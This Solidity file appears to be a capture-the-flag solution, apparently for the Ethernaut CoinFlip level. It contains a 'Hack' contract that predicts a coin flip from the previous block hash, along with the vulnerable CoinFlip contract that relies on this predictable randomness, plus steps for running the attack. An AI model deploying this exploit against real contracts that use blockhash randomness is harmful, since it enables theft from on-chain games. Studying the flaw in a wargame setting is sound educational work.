// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

// Flip coin contract below uses the previous blockhash as input to determine the outcome
// We can do this too in a separate Hack contract and make our guess correct each time

// Use contract coinflip as interface
interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);
    function flip(bool) external returns (bool);
}

contract Hack {
    ICoinFlip private immutable contractFlip;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // Deploy with the address of the deployed flip coin game below
    constructor(address _contractFlip) {
        contractFlip = ICoinFlip(_contractFlip);
    }

    // Key is that we send the correct outcome (the guess) to the flip coin contract
    // call this function 10 times

    // 1. Call the flip() function in the Hack contract:
    // The Hack contract calls _guess() to compute the correct guess for the coin flip using the block hash of the previous block.

    // 2. Compute the Correct Guess:
    // The _guess() function computes whether the result of the coin flip is true (heads) or false (tails) based on
    // the block hash of the previous block, which can be read publicly.

    // 3. Call the Vulnerable CoinFlip Contract’s flip() Function:
    // The Hack contract passes the correct guess to the vulnerable CoinFlip contract’s flip() function.
    // Since the guess is based on the exact same block hash and division logic, it is always correct,
    // and the CoinFlip contract will increment the consecutiveWins counter.

    // To run
    // Deploy Hack address with CA of the instance address
    // Load Flip coin deployed contract with instance address
    // Use flip function from hack contract
    function flip() external {
        bool guess = _guess();
        require(contractFlip.flip(guess), "guess failed");
    }

    function _guess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
